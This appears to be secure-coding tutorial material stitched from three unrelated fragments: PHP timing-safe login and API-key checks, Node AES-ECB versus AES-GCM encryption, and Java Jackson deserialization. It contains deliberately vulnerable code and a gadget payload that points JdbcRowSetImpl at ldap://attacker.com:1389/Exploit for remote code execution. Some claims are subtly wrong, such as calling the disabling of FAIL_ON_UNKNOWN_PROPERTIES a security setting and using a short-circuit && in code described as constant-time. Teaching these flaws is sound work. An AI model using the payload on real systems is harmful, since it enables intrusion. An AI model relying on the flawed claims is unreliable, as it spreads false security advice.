            // Layer 1: Rate limiting check
            if ($this->isRateLimited($clientIp, $username)) {
                $this->logger->warning('Rate limit exceeded', [
                    'ip' => $this->hashIp($clientIp),
                    'username_hash' => hash('sha256', $username)
                ]);
                return new AuthResult(false, 'RATE_LIMITED', 'Too many attempts. Please try again later.');
            }

            // Layer 2: Fetch user with constant-time database lookup
            $user = $this->fetchUser($username);

            // Layer 3: Constant-time password verification
            $hashToCheck = $user ? $user['password_hash'] : $this->fakePasswordHash;
            $passwordValid = password_verify($password, $hashToCheck);

            // Layer 4: Combined validation (prevents timing leaks from boolean short-circuit)
            $authSuccess = ($user !== null) & $passwordValid; // Bitwise AND - no short circuit

            if ($authSuccess) {
                $this->handleSuccessfulLogin($user, $clientIp);
                return new AuthResult(true, 'SUCCESS', null, $user['id']);
            } else {
                $this->handleFailedLogin($username, $clientIp);
                return new AuthResult(false, 'INVALID_CREDENTIALS', 'Invalid credentials');
            }

        } finally {
            // Layer 5: Ensure constant response time (target: 200ms)
            $elapsed = (hrtime(true) - $startTime) / 1e6; // Convert to milliseconds
            $targetTime = 200;
            if ($elapsed < $targetTime) {
                usleep((int)(($targetTime - $elapsed) * 1000));
            }
        }
    }

    /**
     * Constant-time API key verification
     */
    public function verifyApiKey(string $providedKey, string $clientIp): AuthResult {
        $startTime = hrtime(true);

        try {
            if ($this->isRateLimited($clientIp, 'api_key')) {
                return new AuthResult(false, 'RATE_LIMITED', 'Too many attempts');
            }

            // Extract key ID from the provided key (format: keyid_secretpart)
            $keyParts = explode('_', $providedKey, 2);
            if (count($keyParts) !== 2) {
                // Still perform constant-time comparison with dummy
                hash_equals(str_repeat('x', 64), str_pad($providedKey, 64, 'x'));
                return new AuthResult(false, 'INVALID_FORMAT', 'Invalid API key format');
            }

            [$keyId, $secretPart] = $keyParts;

            // Fetch the hashed key from database
            $stmt = $this->pdo->prepare(
                "SELECT id, key_hash, user_id, scopes, expires_at FROM api_keys WHERE key_id = ? AND revoked = 0"
            );
            $stmt->execute([$keyId]);
            $apiKey = $stmt->fetch(PDO::FETCH_ASSOC);

            // CRITICAL: Constant-time comparison using hash_equals
            $storedHash = $apiKey ? $apiKey['key_hash'] : hash('sha256', 'dummy_key_for_timing');
            $providedHash = hash('sha256', $secretPart);

            // hash_equals is timing-safe
            $keyValid = hash_equals($storedHash, $providedHash);

            // Check expiration (constant time)
            $notExpired = $apiKey && (strtotime($apiKey['expires_at']) > time());

            // Combined check using bitwise AND
            $authSuccess = ($apiKey !== null) & $keyValid & $notExpired;

            if ($authSuccess) {
                $this->logger->info('API key authentication successful', [
                    'key_id' => $keyId,
                    'user_id' => $apiKey['user_id']
                ]);
                return new AuthResult(true, 'SUCCESS', null, $apiKey['user_id'], $apiKey['scopes']);
            }

            $this->logger->warning('API key authentication failed', [
                'key_id_hash' => hash('sha256', $keyId),
                'ip' => $this->hashIp($clientIp)
            ]);
            return new AuthResult(false, 'INVALID_KEY', 'Invalid API key');

        } finally {
            $elapsed = (hrtime(true) - $startTime) / 1e6;
            $targetTime = 50;
            if ($elapsed < $targetTime) {
                usleep((int)(($targetTime - $elapsed) * 1000));
            }
        }
    }

    /**
     * Constant-time token verification for session/JWT tokens
     */
    public function verifyToken(string $token): ?array {
        // For HMAC-based tokens, use hash_equals
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }

        [$header, $payload, $signature] = $parts;

        // Recompute expected signature
        $expectedSignature = hash_hmac(
            'sha256',
            "$header.$payload",
            $this->config['jwt_secret'],
            true
        );
        $expectedSignatureEncoded = rtrim(strtr(base64_encode($expectedSignature), '+/', '-_'), '=');

        // CRITICAL: Constant-time signature comparison
        if (!hash_equals($expectedSignatureEncoded, $signature)) {
            return null;
        }

        $payloadData = json_decode(base64_decode(strtr($payload, '-_', '+/')), true);

        // Verify expiration
        if (!isset($payloadData['exp']) || $payloadData['exp'] < time()) {
            return null;
        }

        return $payloadData;
    }

    private function isRateLimited(string $clientIp, string $identifier): bool {
        $key = "auth_attempts:{$this->hashIp($clientIp)}:" . hash('sha256', $identifier);
        $attempts = (int)$this->redis->get($key);
        return $attempts >= self::MAX_ATTEMPTS;
    }

    private function handleFailedLogin(string $username, string $clientIp): void {
        $key = "auth_attempts:{$this->hashIp($clientIp)}:" . hash('sha256', $username);
        $this->redis->incr($key);
        $this->redis->expire($key, self::LOCKOUT_DURATION);

        // Audit log (without sensitive data)
        $this->logger->warning('Failed login attempt', [
            'username_hash' => hash('sha256', $username),
            'ip_hash' => $this->hashIp($clientIp),
            'timestamp' => time()
        ]);
    }

    private function handleSuccessfulLogin(array $user, string $clientIp): void {
        // Clear rate limit
        $key = "auth_attempts:{$this->hashIp($clientIp)}:" . hash('sha256', $user['username']);
        $this->redis->del($key);

        // Update last login
        $stmt = $this->pdo->prepare("UPDATE users SET last_login = NOW() WHERE id = ?");
        $stmt->execute([$user['id']]);

        // Audit log
        $this->logger->info('Successful login', [
            'user_id' => $user['id'],
            'ip_hash' => $this->hashIp($clientIp),
            'timestamp' => time()
        ]);
    }

    private function fetchUser(string $username): ?array {
        $stmt = $this->pdo->prepare(
            "SELECT id, username, password_hash, is_active FROM users WHERE username = ?"
        );
        $stmt->execute([$username]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        return ($user && $user['is_active']) ? $user : null;
    }

    private function hashIp(string $ip): string {
        return hash_hmac('sha256', $ip, $this->config['ip_hash_key']);
    }
}

class AuthResult {
    public bool $success;
    public string $code;
    public ?string $message;
    public ?int $userId;
    public ?array $scopes;

    public function __construct(
        bool $success,
        string $code,
        ?string $message = null,
        ?int $userId = null,
        ?array $scopes = null
    ) {
        $this->success = $success;
        $this->code = $code;
        $this->message = $message;
        $this->userId = $userId;
        $this->scopes = $scopes;
    }
}
```

**Defense in Depth Layers**:

1. **Constant-time comparisons using `hash_equals()`**:
```php
// ALWAYS use hash_equals for secret comparison
$valid = hash_equals($storedHash, $providedHash); // Timing-safe

// NEVER use these for secrets:
$valid = ($storedHash === $providedHash); // VULNERABLE - timing leak
$valid = strcmp($storedHash, $providedHash) === 0; // VULNERABLE
```

2. **Bitwise AND to prevent short-circuit evaluation**:
```php
// VULNERABLE: Short-circuit can leak timing
if ($userExists && $passwordValid) { } // passwordValid only evaluated if userExists is true

// SECURE: Bitwise AND evaluates both
$success = $userExists & $passwordValid; // Both always evaluated
```

3. **Fixed response time padding**:
```php
// Ensure all responses take the same amount of time
$startTime = hrtime(true);
try {
    // ... authentication logic ...
} finally {
    $elapsed = (hrtime(true) - $startTime) / 1e6;
    $targetTime = 200; // 200ms target
    if ($elapsed < $targetTime) {
        usleep((int)(($targetTime - $elapsed) * 1000));
    }
}
```

**Additional Protections**:
- **Rate limiting per IP and username combination**: Prevents statistical analysis attacks that require many requests
- **Progressive delays**: Consider implementing exponential backoff after failed attempts
- **Account lockout notifications**: Alert users via email when their account is targeted
- **Monitoring and alerting**: Set up alerts for unusual authentication patterns (many failures from single IP, distributed failures for single username)
- **Geographic anomaly detection**: Flag logins from unusual locations
- **CAPTCHA after failures**: Require CAPTCHA after 3 failed attempts to slow automated attacks
- **Secure audit logging**: Log authentication events without exposing sensitive data (hash usernames/IPs)

Using Node's crypto module can be safe, but many applications misuse it by picking broken algorithms (like AES-ECB), hardcoding keys, or reusing IVs. Here's a concrete example of what **not** to do and how to fix it using modern, authenticated encryption (AES-256-GCM) with proper key management.

**VULNERABLE CODE**:

```typescript
import crypto from 'crypto';

// ❌ Hardcoded key and IV, weak algorithm mode, no authentication
const LEGACY_KEY = Buffer.from('1234567890123456'); // 16 bytes for AES-128
const LEGACY_IV = Buffer.alloc(16, 0); // All-zero IV (reused!)

export function insecureEncrypt(plaintext: string): string {
  // ❌ AES-128-ECB is deterministic and not semantically secure
  const cipher = crypto.createCipheriv('aes-128-ecb', LEGACY_KEY, null as any);
  let encrypted = cipher.update(plaintext, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  // No IV or auth tag stored
  return encrypted;
}

export function insecureDecrypt(ciphertextB64: string): string {
  const decipher = crypto.createDecipheriv('aes-128-ecb', LEGACY_KEY, null as any);
  let decrypted = decipher.update(ciphertextB64, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// Example usage
const secret = 'card=4111111111111111&cvv=123';
const enc = insecureEncrypt(secret);
console.log('Encrypted:', enc);
console.log('Decrypted:', insecureDecrypt(enc));
```

**Attack Payload** (pattern-based and offline attacks):
```text
Known-plaintext attack: attacker knows user records often start with
"card=4" (for Visa). Because AES-ECB is deterministic and has no IV,
identical 16-byte blocks of plaintext produce identical blocks of ciphertext.

An attacker can:
1. Collect many encrypted records.
2. Look for repeating ciphertext blocks corresponding to structured fields
   (e.g., same card prefix, same user IDs).
3. Use pattern analysis or build a codebook of block -> plaintext mappings.
4. Once the key leaks once (e.g., from source code), all past data is
   decryptable because the key is hardcoded and never rotated.
```

**Why This Is Dangerous**:
- Uses **AES-ECB**, which is not semantically secure and leaks patterns in the plaintext.
- Uses a **hardcoded symmetric key**, meaning anyone with source access (or a leak) can decrypt all data; no rotation possible.
- Lacks **integrity/authentication** (no MAC or AEAD like GCM), enabling silent ciphertext tampering without detection.

**SECURE VERSION**:

```typescript
import crypto from 'crypto';

// Use environment variables or a secrets manager in real deployments
// Here we expect a 32-byte base64 key for AES-256.
const ENCRYPTION_KEY_B64 = process.env.APP_ENC_KEY_B64 || '';

if (!ENCRYPTION_KEY_B64) {
  throw new Error('APP_ENC_KEY_B64 is not set');
}

const ENCRYPTION_KEY = Buffer.from(ENCRYPTION_KEY_B64, 'base64');
if (ENCRYPTION_KEY.length !== 32) {
  throw new Error('APP_ENC_KEY_B64 must decode to 32 bytes for AES-256-GCM');
}

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 12; // 96 bits recommended for GCM

export interface EncryptedPayload {
  iv: string;        // base64
  ciphertext: string; // base64
  authTag: string;    // base64
}

export function secureEncrypt(plaintext: string): EncryptedPayload {
  const iv = crypto.randomBytes(IV_LENGTH); // Unique per encryption

  const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
  const ciphertext = Buffer.concat([
    cipher.update(plaintext, 'utf8'),
    cipher.final(),
  ]);

  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('base64'),
    ciphertext: ciphertext.toString('base64'),
    authTag: authTag.toString('base64'),
  };
}

export function secureDecrypt(payload: EncryptedPayload): string {
  const iv = Buffer.from(payload.iv, 'base64');
  const ciphertext = Buffer.from(payload.ciphertext, 'base64');
  const authTag = Buffer.from(payload.authTag, 'base64');

  const decipher = crypto.createDecipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
  decipher.setAuthTag(authTag);

  const plaintextBuf = Buffer.concat([
    decipher.update(ciphertext),
    decipher.final(), // Throws if auth fails
  ]);

  return plaintextBuf.toString('utf8');
}

// Example usage with basic error handling
function demo(): void {
  const secret = 'card=4111111111111111&cvv=123';
  try {
    const enc = secureEncrypt(secret);
    console.log('Encrypted payload:', enc);

    const dec = secureDecrypt(enc);
    console.log('Decrypted:', dec);
  } catch (err) {
    console.error('Encryption/decryption error:', err);
  }
}

demo();
```

**Key Security Controls**:
- **Authenticated encryption (AES-256-GCM)**: Provides both confidentiality and integrity; tampering is detected via the GCM auth tag.
- **Strong key management**: The key is loaded from an environment variable (or a secrets manager in real systems) instead of being hardcoded, allowing rotation and restricted access.
- **Random, per-message IVs**: Each encryption uses a fresh 96-bit IV from `crypto.randomBytes`, preventing pattern leakage and strengthening security against many attacks on repeated messages.

In production, you want a robust crypto utility that supports key rotation, clean separation of environment-specific config, structured logging, and defensive checks. Below is a pattern using AES-256-GCM with key IDs, safe error handling, and hooks for monitoring.

**PRODUCTION PATTERN**:

```typescript
import crypto from 'crypto';

// ---- Types ----

interface EncryptionKey {
  id: string;          // Key identifier (e.g., "k-2025-01")
  material: Buffer;    // 32-byte AES key
}

export interface EncryptedRecord {
  keyId: string;   // Which key was used
  iv: string;      // base64
  ciphertext: string; // base64
  authTag: string; // base64
  alg: string;     // Algorithm identifier
}

// ---- Configuration & Key Loading ----

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 12; // 96 bits

// Example: ENV variables
// APP_ENC_ACTIVE_KEY_ID = "k-2025-01"
// APP_ENC_KEYS_JSON = '[{"id":"k-2024-12","keyB64":"..."},{"id":"k-2025-01","keyB64":"..."}]'

function loadKeysFromEnv(): { activeKeyId: string; keys: Map<string, EncryptionKey> } {
  const activeId = process.env.APP_ENC_ACTIVE_KEY_ID || '';
  const keysJson = process.env.APP_ENC_KEYS_JSON || '[]';

  if (!activeId) {
    throw new Error('APP_ENC_ACTIVE_KEY_ID is not set');
  }

  let rawKeys: Array<{ id: string; keyB64: string }>;
  try {
    rawKeys = JSON.parse(keysJson);
  } catch (err) {
    throw new Error('APP_ENC_KEYS_JSON is invalid JSON');
  }

  const map = new Map<string, EncryptionKey>();

  for (const k of rawKeys) {
    const material = Buffer.from(k.keyB64, 'base64');
    if (material.length !== 32) {
      console.warn(`Skipping key ${k.id}: not 32 bytes`);
      continue;
    }
    map.set(k.id, { id: k.id, material });
  }

  if (!map.has(activeId)) {
    throw new Error(`Active key ${activeId} not found in APP_ENC_KEYS_JSON`);
  }

  return { activeKeyId: activeId, keys: map };
}

const { activeKeyId, keys: keyStore } = loadKeysFromEnv();

// ---- Logger (simplified) ----

function logInfo(msg: string, meta?: Record<string, unknown>): void {
  console.log(JSON.stringify({ level: 'info', msg, ...meta }));
}

function logWarn(msg: string, meta?: Record<string, unknown>): void {
  console.warn(JSON.stringify({ level: 'warn', msg, ...meta }));
}

function logError(msg: string, meta?: Record<string, unknown>): void {
  console.error(JSON.stringify({ level: 'error', msg, ...meta }));
}

// ---- Crypto Utility with Key Rotation ----

export class CryptoService {
  private readonly alg = ALGORITHM;
  private readonly ivLength = IV_LENGTH;

  encrypt(plaintext: string, context?: string): EncryptedRecord {
    const key = keyStore.get(activeKeyId);
    if (!key) {
      throw new Error('Active encryption key missing');
    }

    const iv = crypto.randomBytes(this.ivLength);

    const cipher = crypto.createCipheriv(this.alg, key.material, iv);

    // Optional: set AAD (Additional Authenticated Data) like a context
    if (context) {
      cipher.setAAD(Buffer.from(context, 'utf8'));
    }

    const ciphertext = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final(),
    ]);

    const authTag = cipher.getAuthTag();

    logInfo('Data encrypted', { keyId: key.id, context });

    return {
      keyId: key.id,
      iv: iv.toString('base64'),
      ciphertext: ciphertext.toString('base64'),
      authTag: authTag.toString('base64'),
      alg: this.alg,
    };
  }

  decrypt(record: EncryptedRecord, context?: string): string {
    const key = keyStore.get(record.keyId);

    if (!key) {
      logError('Decryption failed: unknown keyId', { keyId: record.keyId });
      throw new Error('Unable to decrypt with provided keyId');
    }

    if (record.alg !== this.alg) {
      logError('Decryption failed: unsupported algorithm', { alg: record.alg });
      throw new Error('Unsupported encryption algorithm');
    }

    const iv = Buffer.from(record.iv, 'base64');
    const ciphertext = Buffer.from(record.ciphertext, 'base64');
    const authTag = Buffer.from(record.authTag, 'base64');

    try {
      const decipher = crypto.createDecipheriv(this.alg, key.material, iv);

      if (context) {
        decipher.setAAD(Buffer.from(context, 'utf8'));
      }

      decipher.setAuthTag(authTag);

      const plaintext = Buffer.concat([
        decipher.update(ciphertext),
        decipher.final(), // Throws if auth fails
      ]).toString('utf8');

      logInfo('Data decrypted', { keyId: key.id, context });
      return plaintext;
    } catch (err) {
      // Do not log plaintext or sensitive values
      logWarn('Decryption integrity/auth failure', {
        keyId: key.id,
        error: (err as Error).message,
      });
      throw new Error('Decryption failed');
    }
  }
}

// ---- Example Usage with Environment Awareness & Rate Limiting Hook ----

const cryptoService = new CryptoService();

// Simulated request-scoped rate limiting (pseudo-code, to be integrated in HTTP handlers)
let ENC_REQUEST_COUNT = 0;
const ENC_RATE_LIMIT = process.env.NODE_ENV === 'production' ? 1000 : 10000; // per process / interval

export function encryptForApi(userId: string, data: string): EncryptedRecord {
  ENC_REQUEST_COUNT++;
  if (ENC_REQUEST_COUNT > ENC_RATE_LIMIT) {
    logWarn('Encryption rate limit exceeded', { userId });
    throw new Error('Service temporarily rate limited');
  }

  const context = `user:${userId}`;
  return cryptoService.encrypt(data, context);
}

export function decryptForApi(userId: string, record: EncryptedRecord): string {
  const context = `user:${userId}`;
  return cryptoService.decrypt(record, context);
}

// Example main: establish environment-specific behavior
function main(): void {
  const env = process.env.NODE_ENV || 'development';
  logInfo('Crypto service starting', { env, activeKeyId });

  try {
    const enc = encryptForApi('u-123', 'super-secret-token');
    const dec = decryptForApi('u-123', enc);
    logInfo('Round-trip success', { decryptedLen: dec.length });
  } catch (err) {
    logError('Crypto operation failed', { error: (err as Error).message });
    if (env === 'production') {
      // In prod, you might trigger alerts/metrics here
      // e.g., increment a Prometheus counter, send to SIEM, etc.
    }
  }
}

main();
```

**Defense in Depth Layers**:
1. **Strong primitives and AEAD (algorithm layer)**:
   - Uses `aes-256-gcm` with 32-byte keys and 96-bit IVs:
   ```typescript
   const cipher = crypto.createCipheriv('aes-256-gcm', key.material, iv);
   ```
   - Authenticated encryption prevents undetected tampering and chosen-ciphertext abuse.

2. **Key management and rotation (configuration layer)**:
   - Multiple keys are loaded from environment, with an explicit active key:
   ```typescript
   const { activeKeyId, keys: keyStore } = loadKeysFromEnv();
   const key = keyStore.get(activeKeyId);
   ```
   - Old keys remain for decryption only, enabling seamless rotation without breaking existing data.

3. **Monitoring, rate limiting, and secure logging (operational layer)**:
   - Structured logs with no sensitive values:
   ```typescript
   logInfo('Data encrypted', { keyId: key.id, context });
   logWarn('Decryption integrity/auth failure', { keyId: key.id, error: err.message });
   ```
   - Simple per-process rate limiting skeleton to integrate with more advanced rate limiters / WAFs.

**Additional Protections**:
- **Environment-specific configuration**: `NODE_ENV` toggles rate limits and can be used to enforce stricter production-only checks (e.g., require keys from a cloud KMS instead of env vars).
- **Audit logging for crypto events**: Each encrypt/decrypt call logs key IDs and contexts, enabling forensic analysis and anomaly detection without exposing plaintext.
- **Graceful degradation and safe failures**: On configuration or decryption errors, the code fails closed (no partial plaintext), logs structured errors, and surfaces a generic error message to callers while preserving security.

JSON parsing in Java requires careful attention to the library version and configuration. Using outdated or misconfigured JSON libraries is one of the most common attack vectors in Java applications.

**VULNERABLE CODE**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import javax.servlet.http.*;
import java.io.IOException;

public class UserApiController extends HttpServlet {
    // Using Jackson 2.9.8 or earlier with dangerous defaults
    private static final ObjectMapper mapper = new ObjectMapper();

    static {
        // DANGEROUS: Enabling default typing allows polymorphic deserialization
        mapper.enableDefaultTyping();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        // Directly deserialize untrusted input
        String jsonInput = request.getReader().lines()
            .reduce("", (acc, line) -> acc + line);

        // VULNERABLE: No validation, dangerous typing enabled
        Object userData = mapper.readValue(jsonInput, Object.class);

        response.setContentType("application/json");
        response.getWriter().write(mapper.writeValueAsString(userData));
    }
}
```

**Attack Payload**:
```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
]
```

**Why This Is Dangerous**:
- `enableDefaultTyping()` allows attackers to specify arbitrary class names in JSON
- Jackson will instantiate any class on the classpath during deserialization
- Gadget chains like `JdbcRowSetImpl` can trigger JNDI injection leading to RCE
- Older Jackson versions have hundreds of known gadget classes in their blocklist

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import javax.servlet.http.*;
import java.io.IOException;

public class UserApiController extends HttpServlet {
    // Use latest Jackson version (2.16.x as of 2024)
    private static final ObjectMapper mapper = JsonMapper.builder()
        // SECURE: Disable dangerous features
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    // Strongly-typed DTO prevents arbitrary class instantiation
    public static class UserRequest {
        private final String username;
        private final String email;

        @JsonCreator
        public UserRequest(
                @JsonProperty("username") String username,
                @JsonProperty("email") String email) {
            this.username = username;
            this.email = email;
        }

        public String getUsername() { return username; }
        public String getEmail() { return email; }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        try {
            // SECURE: Deserialize to specific type, not Object.class
            UserRequest userData = mapper.readValue(
                request.getInputStream(), 
                UserRequest.class
            );

            response.setContentType("application/json");
            response.getWriter().write(mapper.writeValueAsString(userData));
        } catch (Exception e) {
            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
            response.getWriter().write("{\"error\":\"Invalid request\"}");
        }
    }
}
```

**Key Security Controls**:
- **Never use `enableDefaultTyping()`**: This is the root cause of most Jackson RCE vulnerabilities
- **Deserialize to concrete types**: Always use specific DTOs instead of `Object.class` or `Map<String, Object>`
- **Keep Jackson updated**: Use version 2.16.x or later which has comprehensive gadget blocklists
- **Use `JsonMapper.builder()`**: Modern builder pattern with secure defaults

Polymorphic deserialization is a legitimate requirement, but it must be implemented with an explicit allowlist. Never allow arbitrary type resolution from user input.

**PRODUCTION PATTERN**:

```java
import com.fasterxml.jackson.annotation.*;
import com.fasterxml.jackson.databind.*;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import javax.servlet.http.*;
import java.io.IOException;
import java.util.Set;

public class SecureMessageController extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureMessageController.class);
    private static final int MAX_PAYLOAD_SIZE = 65536; // 64KB limit

    // SECURE: Explicit allowlist for polymorphic types
    private static final PolymorphicTypeValidator TYPE_VALIDATOR = 
        BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(Message.class)  // Only allow Message subtypes
            .allowIfSubType("com.myapp.messages.")  // Only from our package
            .build();

    private static final ObjectMapper mapper = JsonMapper.builder()
        .activateDefaultTyping(TYPE_VALIDATOR, ObjectMapper.DefaultTyping.NON_FINAL)
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    // SECURE: Closed type hierarchy with annotation-based type info
    @JsonTypeInfo(
        use = JsonTypeInfo.Id.NAME,
        include = JsonTypeInfo.As.PROPERTY,
        property = "type",
        visible = true
    )
    @JsonSubTypes({
        @JsonSubTypes.Type(value = TextMessage.class, name = "text"),
        @JsonSubTypes.Type(value = ImageMessage.class, name = "image"),
        @JsonSubTypes.Type(value = FileMessage.class, name = "file")
    })
    public static abstract class Message {
        private String id;
        private long timestamp;

        public String getId() { return id; }
        public void setId(String id) { this.id = id; }
        public long getTimestamp() { return timestamp; }
        public void setTimestamp(long timestamp) { this.timestamp = timestamp; }

        public abstract String getType();
    }

    public static class TextMessage extends Message {
        private String content;

        @Override
        public String getType() { return "text"; }
        public String getContent() { return content; }
        public void setContent(String content) { this.content = content; }
    }

    public static class ImageMessage extends Message {
        private String imageUrl;
        private String altText;

        @Override
        public String getType() { return "image"; }
        public String getImageUrl() { return imageUrl; }
        public void setImageUrl(String imageUrl) { this.imageUrl = imageUrl; }
        public String getAltText() { return altText; }
        public void setAltText(String altText) { this.altText = altText; }
    }

    public static class FileMessage extends Message {
        private String filename;
        private long fileSize;

        @Override
        public String getType() { return "file"; }
        public String getFilename() { return filename; }
        public void setFilename(String filename) { this.filename = filename; }
        public long getFileSize() { return fileSize; }
        public void setFileSize(long fileSize) { this.fileSize = fileSize; }
    }

    // Allowed type names for validation
    private static final Set<String> ALLOWED_TYPES = Set.of("text", "image", "file");

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        String clientIP = request.getRemoteAddr();

        try {
            // DEFENSE 1: Size limit prevents DoS
            if (request.getContentLength() > MAX_PAYLOAD_SIZE) {
                logger.warn("Payload size exceeded from IP: {}", clientIP);
                sendError(response, HttpServletResponse.SC_REQUEST_ENTITY_TOO_LARGE, 
                         "Payload too large");
                return;
            }

            // DEFENSE 2: Content-Type validation
            String contentType = request.getContentType();
            if (contentType == null || !contentType.contains("application/json")) {
                logger.warn("Invalid content type from IP: {}: {}", clientIP, contentType);
                sendError(response, HttpServletResponse.SC_UNSUPPORTED_MEDIA_TYPE, 
                         "Content-Type must be application/json");
                return;
            }

            // DEFENSE 3: Deserialize with type validator
            Message message = mapper.readValue(request.getInputStream(), Message.class);

            // DEFENSE 4: Additional business validation
            if (!ALLOWED_TYPES.contains(message.getType())) {
                logger.warn("Unknown message type from IP: {}: {}", clientIP, message.getType());
                sendError(response, HttpServletResponse.SC_BAD_REQUEST, "Invalid message type");
                return;
            }

            // Audit log for security monitoring
            logger.info("Message received - type: {}, id: {}, from: {}", 
                       message.getType(), message.getId(), clientIP);

            // Process message...
            response.setContentType("application/json");
            response.getWriter().write("{\"status\":\"received\"}");

        } catch (JsonProcessingException e) {
            logger.error("JSON parsing error from IP: {}: {}", clientIP, e.getMessage());
            sendError(response, HttpServletResponse.SC_BAD_REQUEST, "Invalid JSON");
        } catch (Exception e) {
            logger.error("Unexpected error processing message from IP: {}", clientIP, e);
            sendError(response, HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Processing error");
        }
    }

    private void sendError(HttpServletResponse response, int status, String message) 
            throws IOException {
        response.setStatus(status);
        response.setContentType("application/json");
        response.getWriter().write("{\"error\":\"" + message + "\"}");
    }
}
